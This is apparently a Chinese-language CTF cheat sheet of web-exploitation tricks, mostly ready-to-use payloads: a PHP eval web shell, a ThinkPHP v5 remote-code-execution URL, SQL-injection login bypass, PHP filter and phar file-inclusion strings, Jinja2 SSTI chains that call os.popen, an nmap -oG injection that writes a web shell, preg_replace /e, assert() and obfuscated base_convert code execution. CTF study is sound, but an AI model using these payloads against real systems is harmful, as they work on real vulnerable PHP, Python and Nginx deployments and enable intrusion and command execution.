# CTF_one_for_all

记录刷题遇到的一些技巧点(所有标题均为关键字)

## 常见加密

- hex:`3535352e706e67 `
- base64:`ZmxhZw==`
- base32:`MZWGCZY=`
- base16:`666C6167`
- md5:`327a6c4304ad5938eaf0efb6cc3e53dc`

## 常见php替代后缀

- .php
- .pth
- phtml
- php3
- php4
- php5

## XSS

<scriphostt>alert(1)</scriphostt>



## php马

```
<script language="php">eval($_REQUEST[1])</script> 
```

## 变量==0

可以传入a这个字符串，等价与0

## 变量不为数字且==数字

'12345a' == 12345

## 命令执行查找文件

```find / -name "flag*"```

## \x35\x44转数字

直接用python print即可

## file_get_content

file_get_content()这个函数不可以读变量的值，但是可以通过传入伪协议读文件,比如直接读flag文件

```
data://text/plain;base64,SSBsb3ZlIFBIUAo=
```
## thinkphp v5远程代码执行

```
http://your-ip:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

## js乱码

尝试alert出来可以获得可以正常使用的代码

## sql注入

--+和#和%23都需要尝试，有的时候某一个可以用

## include

```
php://filter/read=convert.base64-encode/resource=flag.php
```

如果遇到一些奇怪的关键字限制

```php
if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){   //必须含有woofers或meowers或index字符串
　　　　　　include ($file . '.php');  //参数后拼接.php
}
```

两种方案，第一种是使用00截断

```
http://6bf8e619-2004-4945-8cf0-1b438d58e4c2.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=flag%00woofers
```

实测可以截断成功但是include出现了一些问题，暂时还不知道为什么，echo出来的参数是没有截断的，但是报错信息给出来的是可以截断的，这个问题暂时放一下

第二种方案是把关键字加在前面

```
http://6bf8e619-2004-4945-8cf0-1b438d58e4c2.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/woofers/resource=flag
```

或者使用php://input，使用post传参数<?php system('ls') ?>

## 跳过反序列化__wakeup()函数

在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行

比如

```
O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```

改为

```
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

## 反序列化禁止数字

添加+号

```
O:+4:"xctf":2:{s:4:"flag";s:3:"111";}
```



## md5对比

弱对比(使用 `==` 判断)可以直接用md5碰撞，以下为常见的md5碰撞字符串,都是以0e开头

```
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
```

强对比(使用`===`)判断

在`===`下就不可以使用md5碰撞这一方法了，但是可以使用列表的方法使其报错，假如是GET传参

```
index.php?a[]=1&b[]=2
```

函数在处理到列表的时候会出错，返回`null`，两个字符串的加密对比都是null则会相同

如果对比过于强，比如使用了string来强制格式，可以使用如下两个参数(暂不知原理)

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

## X-forwarded-for

可以通过此字段执行命令

```
X-Forwarded-For:{system('cat /flag')}
```

## nmap命令执行

关键参数

```
-oG #可以实现将命令和结果写到文件
```

payload，单引号需要自行拼接

```
' <?= @eval($_POST["pd"]);?> -oG pd.phtml '
```

## Nginx

> 配置文件存放目录：/etc/nginx
> 主配置文件：/etc/nginx/conf/nginx.conf
> 管理脚本：/usr/lib64/systemd/system/nginx.service
> 模块：/usr/lisb64/nginx/modules
> 应用程序：/usr/sbin/nginx
> 程序默认存放位置：/usr/share/nginx/html
> 日志默认存放位置：/var/log/nginx
> 配置文件目录为：/usr/local/nginx/conf/nginx.conf

 alias 用于给 localtion 指定的路径设置别名 , 在路径匹配时 , alias 会把 location 后面配置的路径丢弃掉 , 并把当前匹配到的目录指向到 alias 指定的目录 . 

比如

```
location /web-img {
   alias /images/;
   autoindex on;
}
```

访问

```
url/web-img../遍历
```



## 联合查询构造虚拟数据登录

```
1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#
```

使用联合查询可以临时增加一条数据，帐号admin密码123

所以直接传

```
name=1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#&pwd=123
```

就可以直接登录

## preg_replace()命令执行

首先简单介绍一下preg_replace()函数

```

preg_replace($pattern, $replacement, $subject)
作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。
$pattern:       要搜索的模式，可以是字符串或一个字符串数组。
$replacement:   用于替换的字符串或字符串数组。
$subject:       要搜索替换的目标字符串或字符串数组。
```
接着关于/e漏洞
```
/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向
引用替换完之后）。
提示：要确保 replacement 构成一个合法的 PHP 代码字符串，
否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
```
也就是说只要在subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码

实例：

```
?pat=/sd/e&rep=system('ls')&sub=sds
```




## phra

使用如下方法

```
file.php?file=phar://upload/46a1b93b4756841e1169e9cf9ebf3ecf.jpg
```

## 目录穿越

比如,com/img可以尝试.com/img../穿越

## SSTI

工具tqlmap（https://github.com/epinna/tplmap）



测试语句{{1+2}}

如果{{被过滤可以使用{%绕过

```
{{"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}
```

另一个

```
{{"".__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
```

https://www.freebuf.com/column/187845.html

这里有寻找类的过程

### tornado获取cookie_secret

`msg={{handler.settings}}`

可以得到

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '2805f671-5e52-45ad-ad7c-53b057a79590'}
```



### 沙箱逃逸

```
{{url_for.__globals__['current_app'].config.FLAG}}



{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
```

此处`{{url_for.__globals__}}`url_for是内置函数，__globals是全局['current_app']代表当前app,然后取config中的flag



## 过滤关键字

```
{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&b=__mro__&c=__subclasses__
```



## 奇怪的目录

index.phps

## urldecode

url二次编码

## assert()

**assert()函数会将读入的代码当做PHP代码来执行**

```
?page=home').phpinfo();//
```

注意闭合语句

## 执行无回显

可以看看源码

## 宽字符

```
%bf
```

## 列表对比

```
$stuff = $_POST["stuff"];
$array = ['admin', 'user'];
if($stuff === $array && $stuff[0] != 'admin') {
```

这种在php5可以通过溢出来实现对于 ===

```
stuff[4294967296]=admin&stuff[1]=user
```

## 数字检测绕过

用正则匹配是否是数字

```
%0a
```

换行绕过可以在后面外接字符

```
num=123%0als
```

## Node.js沙箱逃逸

```
import requests
import time
url = 'http://19a931b5-2f8a-42c4-b400-20ba417d6a4f.node3.buuoj.cn/?data=Buffer(500)'

while True:
        r = requests.get(url)

        time.sleep(0.1)
        print('trying')
        if 'flag{' in r.text:
            print(r.text)
            break
```

https://blog.csdn.net/SopRomeo/article/details/108963957

## 目录穿越屏蔽../

使用....//绕过

## 数学函数现代码执行

```
($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882)))
```

```
base_convert(1751504350,10,36) -------->system

$pi(1438255411,14,34) ------>hex2bin

dechex(1852579882) ----->将十进制转为十六进制：6e6c202a（字符串形式是：nl *）

nl *可以读取当前目录下的所有文件
```



## htaccess文件包含

```
搜索文件
php_value auto_append_file master://search/path={}&name={}
包含文件
php_value auto_append_file /home/hiahiahia_flag.php
```



